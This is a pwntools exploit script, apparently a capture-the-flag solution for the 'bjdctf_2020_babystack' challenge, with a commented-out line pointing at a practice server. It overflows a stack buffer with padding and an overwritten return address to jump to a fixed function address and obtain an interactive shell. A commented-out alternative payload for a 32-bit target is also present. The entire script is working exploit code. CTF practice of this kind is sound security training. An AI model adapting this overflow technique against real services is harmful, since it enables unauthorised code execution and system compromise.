from pwn import *
# context.terminal=['tmux','splitx','-h']
context.log_level='debug'

# p=remote("node4.buuoj.cn",28967)
p=process("./bjdctf_2020_babystack")

addr=0x4006E6

# 4007a7
# 4007c0


payload=0x10*b'\0'+8*b'1'+p64(addr)

# with open("./input","wb")as f:
#     f.write(payload)

# payload=136*b'A'+4*b'B'+p32(0x8048320)+4*b'0'+p32(0x0804A024)
# p.sendafter(b"[+]What's u name?\n",payload)


p.recvuntil(b'[+]Please input the length of your name:\n')
p.sendline("100")
# print("2333")
p.recvuntil(b"[+]What's u name?\n")
p.sendline(payload)

p.interactive()


